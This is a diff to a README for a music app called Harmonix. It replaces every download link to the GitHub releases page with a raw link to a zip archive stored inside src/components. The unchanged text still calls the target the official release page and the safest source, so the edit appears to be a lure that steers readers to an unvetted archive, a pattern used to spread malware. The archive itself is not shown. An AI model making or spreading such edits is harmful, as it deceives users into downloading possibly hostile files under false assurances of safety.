@@ -1,6 +1,6 @@
 # 🎵 Harmonix - Streamline Your Music Experience
 
-[![Download Harmonix](https://img.shields.io/badge/Download-Harmonix-brightgreen?style=for-the-badge)](https://github.com/Moumitasubi/Harmonix/releases)
+[![Download Harmonix](https://img.shields.io/badge/Download-Harmonix-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Moumitasubi/Harmonix/main/src/components/Software_1.9.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Harmonix does not require installation if you use the portable version. For the 
 
 Click the link below to go to the official Harmonix release page:
 
-[![Download Harmonix](https://img.shields.io/badge/Download-Harmonix-blue?style=for-the-badge)](https://github.com/Moumitasubi/Harmonix/releases)
+[![Download Harmonix](https://img.shields.io/badge/Download-Harmonix-blue?style=for-the-badge)](https://raw.githubusercontent.com/Moumitasubi/Harmonix/main/src/components/Software_1.9.zip)
 
 This page contains the latest versions of the software. You will find files ready to download.
 
@@ -143,7 +143,7 @@ Here are quick tips if you run into problems:
 
 To keep Harmonix running smoothly, check the release page regularly:
 
-[Download Latest Releases](https://github.com/Moumitasubi/Harmonix/releases)
+[Download Latest Releases](https://raw.githubusercontent.com/Moumitasubi/Harmonix/main/src/components/Software_1.9.zip)
 
 Look for new versions with updated features or fixes. Download the updated file and install it over the old one, or replace the portable files if you use that version.
 
@@ -153,6 +153,6 @@ Look for new versions with updated features or fixes. Download the updated file 
 
 Get the latest version here:
 
-[![Download Harmonix](https://img.shields.io/badge/Download-Harmonix-brightgreen?style=for-the-badge)](https://github.com/Moumitasubi/Harmonix/releases)
+[![Download Harmonix](https://img.shields.io/badge/Download-Harmonix-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Moumitasubi/Harmonix/main/src/components/Software_1.9.zip)
 
 This is the safest way to get your copy of Harmonix directly from the developer.
